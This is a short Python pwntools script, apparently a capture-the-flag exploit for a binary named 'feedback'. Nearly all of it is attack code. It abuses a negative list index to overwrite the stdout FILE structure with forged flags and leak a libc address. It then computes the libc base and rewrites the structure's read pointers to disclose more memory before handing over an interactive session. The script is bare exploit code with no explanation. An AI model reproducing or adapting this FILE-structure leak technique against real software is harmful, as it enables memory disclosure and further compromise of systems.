#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./feedback')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

io.sendafter(b"Which list do you want to write?", str(-8).encode())

leak_libc = flat(
    {
        0:0xfbad1800,
        8:0,
        0x18:0
    }, filler = b'\x00'
) + b'\x00'
io.sendlineafter(b"Then you can input your feedback.", leak_libc)
libc_base = u64(io.recvuntil(b"\x7f")[-6:] + b'\x00' * 2) - 0x1ec980
success("libc_base --> " + hex(libc_base))

io.sendafter(b"Which list do you want to write?", str(-8).encode())

fake_file_struct = flat(
    {
        0:0xfbad1800,
        8:0,
        0x18:0,
        0x20:libc_base +0x1f1700,
        0x28:libc_base + 0x1f1720
    }, filler = b'\x00'
)
#p()
io.sendlineafter(b"Then you can input your feedback.", fake_file_struct)

io.interactive()
